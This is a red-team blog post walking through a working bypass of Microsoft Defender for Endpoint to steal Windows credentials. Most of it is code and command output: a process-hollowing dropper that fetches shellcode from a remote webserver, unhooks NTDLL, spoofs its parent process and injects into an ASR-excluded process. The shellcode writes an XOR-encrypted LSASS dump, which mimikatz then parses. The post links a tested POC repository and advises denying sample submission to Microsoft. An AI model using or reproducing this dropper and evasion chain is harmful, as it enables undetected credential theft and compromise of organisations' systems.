---
title: Operating in the Blindspots of MDE - NtNotUnmapSection
date: 2024-03-27 09:48:47 +07:00
categories: RedTeaming
#modified: 20-08-29 09:24:47 +07:00
#tags: [blog, netlify, jekyll, github]
description: MDE Bypass
#thumbnail: "https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Paces_Review/lab.png"
#image: "https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Paces_Review/lab.png"
---


In the modern day it isn't possible to just inject into LSASS without being flagged by EDR's / AV's. Current techniques have evolved to create a minidump of the LSASS process and parse it later locally to retrieve credentials.

Since modern EDR's such as MDE (Microsoft's Defender for Endpoint) too have evolved for detections around various LSASS dumping techniques, is there any way to abuse classic LSASS dumping techniques using APIs such as the heavily monitored MiniDumpWriteDump function and still remain undetected on an EDR such as MDE? The answer is yes if we can breakdown MDE detections and perform execution in the blind spots of the EDR, in this case MDE. 

A good starting point to understand telemetry features and figure blind spots to operate in for a specific EDR is the [EDR Telemetry Project](https://github.com/tsale/EDR-Telemetry).

In this blog, the approach is to create a shellcode dropper leveraging common process injection techniques such as Process Hollowing to evade MDE and perform a covert LSASS dump remotely using shellcode that leverages the MiniDumpWriteDump function. 

### Creating a dropper POC based on Process Hollowing

For Process Injection, we can borrow inspiration from a common Process Injection technique called[ Process Hollowing](https://attack.mitre.org/techniques/T1055/012/).

EDRs primarily detect commonly known process injection techniques by:
- Function Hooking DLLs
- Static analysis and PE parsing such as Import Address table
- Kernel Callbacks and drivers
- AV Engines such as Defender
- Heuristic, sandbox and cloud analysis
-  Event Tracing for Windows and much more

Using standard WINAPI's associated with the Process Hollowing technique would get us flagged by defender and MDE, hence we leverage NT API equivalents instead.

To leverage appropriate NT APIs associated with Process Hollowing (partial hollowing - without reallocations) a simple POC can be created with the following logic:
1. Create a process using NtCreateUserProcess 
2. Download HTTP(S) shellcode
3. Create section in the local process using NtCreateSection
4. Map the section using NtMapViewOfSection and copy shellcode into it
5. Map the section into a remote process 
6. Update the thread context to execute shellcode
7. Unmap the section using NtUnMapViewOfSection

The standard way to resolve the above associated APIs is by importing the NTDLL module and then invoking appropriate APIs. Loading a fresh NTDLL module this way would get us flagged due to hooking and kernel routines / callbacks. Alternatives such as direct, indirect syscalls too are flagged due to IoCs and detections that have been recently popularized such as - execution of `ret` outside NTDLL, abnormal syscall execution using the `sys` instruction, Event Tracing for Windows (ETW), abnormal call stacks etc.

One method to get a clean NTDLL module without MDE raising telemetry and detections is the [Blindside technique](https://github.com/CymulateResearch/Blindside), which leverages hardware breakpoints and debugging techniques.

Blog Reference: <https://cymulate.com/blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints>

Blindside works by initially spawning a debug process, employing a breakpoint handler to set a hardware breakpoint, which compels the debugged process to load solely a fresh copy of the NTDLL module in memory. The breakpoint obstructs the loading of additional DLLs by hooking LdrLoadDLL, thus creating a process with only the NTDLL in a stand-alone, unhooked state.
Here's a good diagram from the above Blindside blog that explains the technique well.

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/NtProccesHollow/Images/Pasted%20image%2020240326004752.png)

This method stays unnoticed / undetected by MDE due to Microsoft's lack of acknowledgment regarding attempts to generate telemetry, as mentioned in the Conclusion section of the Blindside blog.

Compiling and analyzing the Blindside POC locally with Defender without any Process Injection code set included, no detections were found.

```
C:\> .\ThreatCheck.exe -f Blindside.exe
[+] No threat found!
```

Testing Blindside execution against an updated machine with MDE enabled and monitoring for alerts and detections, we find none.

```
C:\> .\Blindside.exe
[+] Creating new process in debug mode
[+] Found LdrLoadDllAddress address: 0x00007FFC875DAE00
[+] Setting HWBP on remote process
[+] Breakpoint Hit!
[+] Copying clean ntdll from remote process
[+] Found ntdll base address: 0x00007FFC875A0000
[+] Unhooked
```

It is now possible to leverage this unhooked NTDLL module to resolve and invoke the mentioned Process Hollowing APIs.
Building on the Blindside source to add Process Injection functionality, replace and resolve all NT APIs associated with Process Hollowing leaving out CreateProcess and other APIs associated with thread context manipulation. 

*Note: NT API header definitions have to be included.*

```
int main()
{
    /* Blindside technique for fresh ntdll */
	[snip]

    // create startup info struct
    LPSTARTUPINFOW startup_info = new STARTUPINFOW();
    startup_info->cb = sizeof(STARTUPINFOW);
    startup_info->dwFlags = STARTF_USESHOWWINDOW;

    // create process info struct
    PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

    // null terminated command line
    wchar_t cmd[] = L"notepad.exe\0";

    /* Process Hollowing */
    // create process
    BOOL success = CreateProcess(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | CREATE_SUSPENDED,
        NULL,
        NULL,
        startup_info,
        process_info);

    // Resolve NtAPIs
    // HMODULE hNtdll is the handle to Unhooked ntdll
    NtCreateSection ntCreateSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection ntMapViewOfSection = (NtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtUnmapViewOfSection ntUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    // create section in local process
	HANDLE localSection;
	LARGE_INTEGER localszSection = { shellcode.size() };
	
	NTSTATUS status = ntCreateSection(
		&localSection,
		SECTION_ALL_ACCESS,
		NULL,
		&localszSection,
		PAGE_EXECUTE_READWRITE,
		SEC_COMMIT,
		NULL);
	
	// map section into memory of local process
	PVOID hLocalAddress = NULL;
	SIZE_T viewSize = 0;
	
	status = ntMapViewOfSection(
		localSection,
		GetCurrentProcess(),
		&hLocalAddress,
		NULL,
		NULL,
		NULL,
		&viewSize,
		ViewShare,
		NULL,
		PAGE_EXECUTE_READWRITE);
	
	// copy shellcode into local memory
	RtlCopyMemory(hLocalAddress, &shellcode[0], shellcode.size());
	
	// map section into memory of remote process
	PVOID hRemoteAddress = NULL;
	
	status = ntMapViewOfSection(
		localSection,
		ntHandle,
		&hRemoteAddress,
		NULL,
		NULL,
		NULL,
		&viewSize,
		ViewShare,
		NULL,
		PAGE_EXECUTE_READWRITE);

	// Get thread context of primary thread
    LPCONTEXT pContext = new CONTEXT();
    pContext->ContextFlags = CONTEXT_INTEGER;
    GetThreadContext(process_info->hThread, pContext);

	// Update RCX register to above
    pContext->Rcx = (DWORD64)hRemoteAddress;
    SetThreadContext(process_info->hThread, pContext);

    // Resume thread
    ResumeThread(process_info->hThread);

    // Unmap memory
    status = ntUnmapViewOfSection(
        GetCurrentProcess(),
        hLocalAddress);
}
```

Testing this POC against MDE we find the following alerts.

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/NtProccesHollow/Images/Pasted%20image%2020230915184322.png)

Process Hollowing is clearly detected. 
Improve the POC by replacing CreateProcess with NtCreateUserProcess, this can be a little tricky to replace. Here is a blog showcasing how to do it: <https://captmeelo.com/redteam/maldev/2022/05/10/ntcreateuserprocess.html>
Make sure to also replace the remaining APIs for thread context manipulation such as - NtGetContextThread, NtSetContextThread and NtResumeThread.

Optionally add a few more checks such as the Process Mitigation Policy to avoid non-Microsoft loads (applicable to other EDRs and not MDE). 

```
DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

	// Add process mitigation attribute
	AttributeList->Attributes[4].Attribute = PS_ATTRIBUTE_MITIGATION_OPTIONS;
	AttributeList->Attributes[4].Size = sizeof(DWORD64);
	AttributeList->Attributes[4].ValuePtr = &policy;
```

Make sure to add a function to incorporate download functionality from a remote webserver using HTTP(S).

```
// download shellcode
std::vector<BYTE> shellcode = DownloadShellcode(url, path);
```

The codebase would be as follows.

```
int main(int argc, char* argv[])
{
	
	/* Blindside technique for unhooked ntdll */
	[snip]

	/* Process Injection */
	// Path to the image file from which the process will be created
	UNICODE_STRING NtImagePath, Params, ImagePath;
	RtlInitUnicodeString(&ImagePath, (PWSTR)L"C:\\Windows\\System32\\notepad.exe");

	RtlInitUnicodeString(&NtImagePath, (PWSTR)L"\\??\\C:\\Windows\\System32\\notepad.exe");
	RtlInitUnicodeString(&Params, (PWSTR)L"\"C:\\WINDOWS\\SYSTEM32\\notepad.exe\" /i EDR_murda!");
	// Create the process parameters
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
	RtlCreateProcessParametersEx(&ProcessParameters, &ImagePath, NULL, NULL, &Params, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);

	// Initialize the PS_CREATE_INFO structure
	PS_CREATE_INFO CreateInfo = { 0 };
	CreateInfo.Size = sizeof(CreateInfo);
	CreateInfo.State = PsCreateInitialState;

	//Skip Image File Execution Options debugger
	CreateInfo.InitState.u1.InitFlags = PsSkipIFEODebugger;

	OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES)};
	PPS_STD_HANDLE_INFO stdHandleInfo = (PPS_STD_HANDLE_INFO)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_STD_HANDLE_INFO));
	PCLIENT_ID clientId = (PCLIENT_ID)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));
	PSECTION_IMAGE_INFORMATION SecImgInfo = (PSECTION_IMAGE_INFORMATION)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SECTION_IMAGE_INFORMATION));
	PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));

	// Create necessary attributes
	AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST);
	AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_CLIENT_ID;
	AttributeList->Attributes[0].Size = sizeof(CLIENT_ID);
	AttributeList->Attributes[0].ValuePtr = clientId;

	AttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_IMAGE_INFO;
	AttributeList->Attributes[1].Size = sizeof(SECTION_IMAGE_INFORMATION);
	AttributeList->Attributes[1].ValuePtr = SecImgInfo;

	AttributeList->Attributes[2].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
	AttributeList->Attributes[2].Size = NtImagePath.Length;
	AttributeList->Attributes[2].ValuePtr = NtImagePath.Buffer;

	AttributeList->Attributes[3].Attribute = PS_ATTRIBUTE_STD_HANDLE_INFO;
	AttributeList->Attributes[3].Size = sizeof(PS_STD_HANDLE_INFO);
	AttributeList->Attributes[3].ValuePtr = stdHandleInfo;

	DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

	// Add process mitigation attribute
	AttributeList->Attributes[4].Attribute = PS_ATTRIBUTE_MITIGATION_OPTIONS;
	AttributeList->Attributes[4].Size = sizeof(DWORD64);
	AttributeList->Attributes[4].ValuePtr = &policy;

	// Spoof Parent Process Id as explorer.exe
	DWORD trayPID;
	HWND trayWnd = FindWindowW(L"Shell_TrayWnd", NULL);
	GetWindowThreadProcessId(trayWnd, &trayPID);
	HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, false, trayPID);
	if (hParent)
	{
		AttributeList->Attributes[5].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
		AttributeList->Attributes[5].Size = sizeof(HANDLE);
		AttributeList->Attributes[5].ValuePtr = hParent;
	}
	else
	{
		AttributeList->TotalLength -= sizeof(PS_ATTRIBUTE);
	}

	// Create the process
	HANDLE ntHandle = NULL, ntThread = NULL;
	ntCreateUserProcess(&ntHandle, &ntThread, MAXIMUM_ALLOWED, MAXIMUM_ALLOWED, &objAttr, &objAttr, 0x00000200, 0x00000001, ProcessParameters, &CreateInfo, AttributeList);

	// download shellcode
	std::vector<BYTE> shellcode = DownloadShellcode(url, path);

	// create section in local process
	HANDLE localSection;
	LARGE_INTEGER localszSection = { shellcode.size() };

	[snip]

	// Get thread context of primary thread
	CONTEXT threadContext;
	threadContext.ContextFlags = CONTEXT_INTEGER;
	ntGetContextThread(ntThread, &threadContext);

	// Update RCX register
	threadContext.Rcx = (DWORD64)hRemoteAddress;

	// Set the modified context back to the primary thread
	ntSetContextThread(ntThread, &threadContext);

	// Resume the thread
	ntResumeThread(ntThread, NULL);
	
	// unmap memory from local process
	status = ntUnmapViewOfSection(
	GetCurrentProcess(),
	hLocalAddress);

	// Clean up injected process
	if(hParent) CloseHandle(hParent);
	RtlFreeHeap(RtlProcessHeap(), 0, AttributeList);
	RtlFreeHeap(RtlProcessHeap(), 0, stdHandleInfo);
	RtlFreeHeap(RtlProcessHeap(), 0, clientId);
	RtlFreeHeap(RtlProcessHeap(), 0, SecImgInfo);
 	RtlDestroyProcessParameters(ProcessParameters);

	// Close Debug process
	CloseHandle(process.hProcess);
	TerminateProcess(process.hProcess, 0);
}
```

### Breaking detection chains - Process Hollowing

Testing against MDE we are still flagged.

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/NtProccesHollow/Images/edited1.png)

Nevertheless, the alerts provided above offer valuable insight into MDE's response and telemetry development towards our POC, some notable detections around our NT Process Hollowing technique include:
- Unusual or hijacked thread contexts
- Mapping and unmapping memory sections
- ASR Rules, in this case: The "Block executable files from running unless they meet a prevalence, age, or trusted criteria" ASR rule.

Usually, EDRs such as MDE correlate multiple potential indicators and if a certain threshold risk score is passed, an alert or action is taken by the EDR against the process. By principle, if we can evade one or more of these indicators, it should break the detection chain and overall decrease the risk score for detection. The focus of evasion here is to get the risk score to a bare acceptable threshold level where detections aren't bound to occur.  

Recent Process Injection techniques like [DllNotificationInjection](https://github.com/ShorSec/DllNotificationInjection/tree/master) and [ThreadlessInject](https://github.com/CCob/ThreadlessInject) avoid the execution of common APIs that are used in thread context manipulation and execution such as SetThreadContext and ResumeThread. We could focus on this indicator, however for Process Hollowing in particular a good indicator to bypass is the mapping and unmapping of memory sections. This is peculiar to this technique while other indicators are often shared with other Process Injection techniques.

It is possible to remove the NtUnMapViewOfSection API without breaking functionality for Process Hollowing with the only consequence being the mapped section would exist until the process terminates, in short a trade-off for bad memory management.
Removing the NtUnMapViewOfSection API gives an interesting result where no detections were further found. The source looks something like this:

```
int main(int argc, char* argv[])
{
	
	/* Blindside technique for unhooked ntdll */
	[snip]
	
	/* Process Injection */
	[snip]

	// Get thread context of primary thread
	CONTEXT threadContext;
	threadContext.ContextFlags = CONTEXT_INTEGER;
	ntGetContextThread(ntThread, &threadContext);

	// Update RCX register
	threadContext.Rcx = (DWORD64)hRemoteAddress;

	// Set the modified context back to the primary thread
	ntSetContextThread(ntThread, &threadContext);

	// Resume the thread
	ntResumeThread(ntThread, NULL);

	// Mapped section isn't unmapped to avoid Process Hollowing IoC's 
	/* status = ntUnmapViewOfSection(
		GetCurrentProcess(),
		hLocalAddress); */

	// Clean up injected process
	if (hParent) CloseHandle(hParent);
	RtlFreeHeap(RtlProcessHeap(), 0, AttributeList);
	RtlFreeHeap(RtlProcessHeap(), 0, stdHandleInfo);
	RtlFreeHeap(RtlProcessHeap(), 0, clientId);
	RtlFreeHeap(RtlProcessHeap(), 0, SecImgInfo);
	RtlDestroyProcessParameters(ProcessParameters);

	// Close Blindside Debug process
	CloseHandle(process.hProcess);
	TerminateProcess(process.hProcess, 0);
}
```

### Leveraging MiniDumpWriteDump Shellcode to bypass MDE detections

EDR Detection mechanisms have evolved around the MiniDumpWriteDump function, primarily detecting such LSASS dumping techniques by:
1. Hooking the MiniDumpWriteDump function along with its associated usage patterns
2. Opening up a new handle to the LSASS process itself
3. Dropping a memory dump of LSASS on disk
4. Signature of the dump file (file gets detected and deleted)

Blog Reference: <https://dec0ne.github.io/research/2022-11-14-Undetected-Lsass-Dump-Workflow/>	

Using the above blog as a reference, it is possible to build a C++ DLL / EXE leveraging the MiniDumpWriteDump API for an encrypted LSASS dump primarily to bypass the Signature of the dump by performing simple XOR / AES encryption. In this case, XOR encryption is leveraged.

Build and compile the DLLHijackLSASSDump POC as an exe / DLL and later convert it to shellcode using [pe2shc](https://github.com/hasherezade/pe_to_shellcode) / [donut](https://github.com/TheWover/donut). Test the shellcode using runshc64.

*NOTE: The source for the DLLHijackLSASSDump shellcode can be found in the `/shellcode` folder on GitHub.*

```
C:> .\pe2shc.exe .\DLLHijackLSASSDump.dll DLLHijackLSASSDump.bin
Using: Loader v2
Reading module from: .\DLLHijackLSASSDump.dll
[INFO] This is a console application.
[INFO] Saved as: DLLHijackLSASSDump.bin

C:> .\runshc64.exe .\DLLHijackLSASSDump2.bin
[*] Reading module from: .\DLLHijackLSASSDump2.bin
>>> Creating a new thread...
[*] Running the shellcode [28e06530000 - 28e06539600]
[+] Searching for LSASS PID
[+] LSASS PID: 1520
[+] Starting dump to memory buffer
[+] Copied 89925780 bytes to memory buffer
[+] Successfully dmped LS@SS to memory!
[+] Xor encrypting the memory buffer containing the dump data
[+] Xor key: ripLs4SS123
[+] Enrypted dump data written to "ENCRYPTED.DMP" file
```

Once done, we serve the shellcode from a remote webserver.

MDE heavily relies on ASR rules for telemetry and detection as noticed above. To perform a successful LSASS dump using the standard MiniDumpWriteDump function (by getting a handle to the LSASS process), we can attempt to invoke this function from an ASR excluded process. 

Reversing and parsing ASR .LUA rules, it is possible to find blind spots to perform trusted execution using the MiniDumpWriteDump function. We can use this approach to gain trusted execution blinding MDE of process telemetry. [hfiref0x](https://github.com/hfiref0x) wrote such a tool named [wd-extract](https://github.com/hfiref0x/WDExtract). 

Pay attention to the ASR reversed rule primarily targeting LSASS dump detections - "Blocking Credential Stealing from LSASS": <https://github.com/HackingLZ/ExtractedDefender/blob/main/asr/9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2>

```
GetPathExclusions = function()
  -- function num : 0_2
  local l_3_0 = {}
  l_3_0["%windir%\\system32\\WerFaultSecure.exe"] = 2
  l_3_0["%windir%\\system32\\mrt.exe"] = 2
  l_3_0["%windir%\\system32\\svchost.exe"] = 2
  l_3_0["%windir%\\system32\\wbem\\WmiPrvSE.exe"] = 2
  [...snip...]
  l_3_0["%windir%\\system32\\CompatTelRunner.exe"] = 2

GetCommandLineExclusions = function()
  -- function num : 0_3
  local l_4_0 = "^\\\"?.:\\\\windows\\\\system32\\\\werfault\\.exe\\\"?((?!\\-s).)*$"
  local l_4_1 = {}
  l_4_1[l_4_0] = 0
  return l_4_1
end
```

We have two fields:
- `GetPathExclusion`: Paths of executables exempted from being detected by the respective ASR rule.
- `GetCommandLineExclusions`: Command line arguments if included will be exempted from being detected by the respective ASR rule.

It is possible to leverage both these rules to perform trusted execution to operate in the blind spots of MDE and avoid detection from the "Blocking Credential Stealing from LSASS" ASR rule.

Processes like WerFaultSecure.exe have issues running shellcode while processes like svchost.exe are heavily monitored hence not all excluded processes make ideal candidates for process injection. In this case we target the CompatTelRunner.exe process.
"CompatTelRunner.exe is also known as Windows Compatibility Telemetry. This periodically sends usage and performance data to Microsoft IP addresses so that improvements can be made on user experience and fix potential errors."
This makes it an optimal choice for injection, given its default availability on a wide range of systems, including Windows Home, Server editions, and Core editions.

An example of a permissible command line argument based on the above `GetCommandLineExclusions` is as follows.

```
"C:\Windows\system32\werfault.exe" -p
```

Incorporate both these changes to the source as follows. 
Also make sure to add functionality to parse arguments for the webserver and shellcode required so that these may not be hard-coded at all times.

```
if (argc < 3) {
	wprintf(L"Usage: <1P or H0stname> <sh3llcod3>\n");
	return 1;
}

LPCWSTR url;
LPCWSTR path;

// Convert narrow-character strings to wide-character strings
int urlLength = MultiByteToWideChar(CP_ACP, 0, argv[1], -1, nullptr, 0);
url = new wchar_t[urlLength];
MultiByteToWideChar(CP_ACP, 0, argv[1], -1, const_cast<LPWSTR>(url), urlLength);

int pathLength = MultiByteToWideChar(CP_ACP, 0, argv[2], -1, nullptr, 0);
path = new wchar_t[pathLength];
MultiByteToWideChar(CP_ACP, 0, argv[2], -1, const_cast<LPWSTR>(path), pathLength);
```

### Testing execution against MDE

The final POC with all above changes which has been tested against MDE can be found here: https://github.com/m3rcer/NtNotUnmapSection

Make sure to compile the POC as a Multi-threaded DLL to avoid runtime detections. 

*NOTE: vc_redist.x64.exe might be required on the target.*

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/NtProccesHollow/Images/Pasted%20image%2020240324013644.png)

Upon testing execution on a patched system (March 2024) with MDE enabled, Microsoft asks to send this file for submission, please deny this and any uploads to VirusTotal.

```
C:\> .\NtNotUnmapSection.exe
Usage: <1P or H0stname> <sh3llcod3>

C:\> .\NtNotUnmapSection.exe 192.168.100.40 DLLHijackLSASSDump.bin
[+] Stealth mode: Unhooking one function
[+] Creating new process in debug mode
[+] Found LdrLoadDllAddress address: 0x00007FFFF2954850
[+] Setting HWBP on remote process
[+] Breakpoint Hit!
[+] Copying clean ntdll from remote process
[+] Found ntdll base address: 0x00007FFFF2920000
[STEALTH] Function Name : NtAllocateVirtualMemory
[STEALTH] Address of Function: 0x0000025409480570
[+] Unhooked

C:\> dir

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/24/2024   3:26 AM       47033665 ENCRYPTED.DMP
-a----         3/24/2024   3:03 AM          21504 NtNotUnmapSection.exe
```


![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/NtProccesHollow/Images/Pasted%20image%2020230913171829.png)

Noting for any alerts, no new alerts are found:

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/NtProccesHollow/Images/Pasted%20image%2020230823180840.png)

Finally, retrieve and decrypt the LSASS dump using a standard XOR decrypting python routine such as below.

*NOTE: decryptor.py can be found in the `/decrypt` folder on GitHub.*

```
import sys
from itertools import cycle

key = bytearray("ripLs4SS123","utf8")
filename = "DECRYPTED.DMP"

try:
    data = bytearray(open(sys.argv[1], "rb").read())
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()

if len(sys.argv) > 2 and sys.argv[2] == "1":
    print("len: {}".format(len(data)))
    print('{ 0x' + ', 0x'.join(hex(x)[2:] for x in data) + ' };')
    sys.exit()
xord_byte_array = bytearray(len(data))
if len(sys.argv) > 2 and sys.argv[2] != "1":
    filename = sys.argv[2]

f = open(filename, "wb")

l = len(key)
for i in range(len(data)):
    current = data[i]
    current_key = key[i % len(key)]
    xord_byte_array[i] = current ^ current_key

f.write(xord_byte_array)
f.close()

print("XORed output saved to \"{}\"".format(filename))
print("Xor Key: {}".format(key.decode()))
sys.exit()
```

Decrypt the dump and finally parse it locally using mimikatz such as follows.

```
C:\> python .\decryptor.py .\ENCRYPTED.dmp
XORed output saved to "DECRYPTED.DMP"
Xor Key: ripLs4SS123

C:\> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 13 2022 17:51:26
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # sekurlsa::minidump DECRYPTED.dmp
Switch to MINIDUMP : 'DECRYPTED.dmp'

mimikatz # sekurlsa::ekeys
Opening : 'DECRYPTED.dmp' file for minidump...

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : TEST$
Domain            : BYPASSMDE
Logon Server      : (null)
Logon Time        : 24-03-2024 15:55:13
SID               : S-1-5-20

         * Username : test$
         * Domain   : BYPASSMDE.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       4c9952ab599063d02f8d4c1cbf54bd058f740c83f9067d3f1223dce73a05467e
           rc4_hmac_nt       d50adb935a746e35f9faccd4f7c62b69
           rc4_hmac_old      d50adb935a746e35f9faccd4f7c62b69
           rc4_md4           d50adb935a746e35f9faccd4f7c62b69
           rc4_hmac_nt_exp   d50adb935a746e35f9faccd4f7c62b69
           rc4_hmac_old_exp  d50adb935a746e35f9faccd4f7c62b69

[snip]

mimikatz # exit
Bye!
```

### Conclusion

Summary for the MDE bypass:
1. Use the Blindside technique to spawn an ASR excluded process as a debug process to get a fresh unhooked NTDLL using hardware breakpoints.
2. Leverage the unhooked NTDLL to convert all Process Hollowing APIs into NT equivalents.
3. Add Process Mitigation Policy (optional).
4. Remove NtUnmapViewOfSection API to bypass Process Hollowing indicators.
5. Add HTTP(S) functionality to download MiniDumpWrite API shellcode from a webserver.
6. Add a routine to XOR / AES encrypt the LSASS dump.
7. Perform process injection into an ASR excluded process with an excluded commandline to get an encrypted LSASS dump.
8. Decrypt the encrypted LSASS dump locally using the python decryption script.

Every EDR possesses its vulnerabilities, which its vendors may overlook; identifying such blind spots can enable the operation of even well signatured techniques to bypass robust EDRs like MDE. 

MDE, in particular, heavily relies on ASR for defense and detection, which could be its Achilles' heel in some cases. Furthermore, the failure to acknowledge submissions from researchers such as the Blindside concept for remediation or telemetry building, leaves the EDR lagging behind the latest adversary techniques.

### Credits

- [Blindside Technique / Hardware Breakpoints by CymulateResearch](https://github.com/CymulateResearch/Blindside)
- [JustinElze and RastaMouse for their research on ASR bypasses](https://github.com/HackingLZ/ExtractedDefender)
- [XOR encrypted LSASS dump using MiniDumpWriteDump](https://dec0ne.github.io/research/2022-11-14-Undetected-Lsass-Dump-Workflow/)
- [pe2shc by hasherezade](https://github.com/hasherezade/pe_to_shellcode)
- [Sektor7's XOR decryptor routine](https://institute.sektor7.net/)

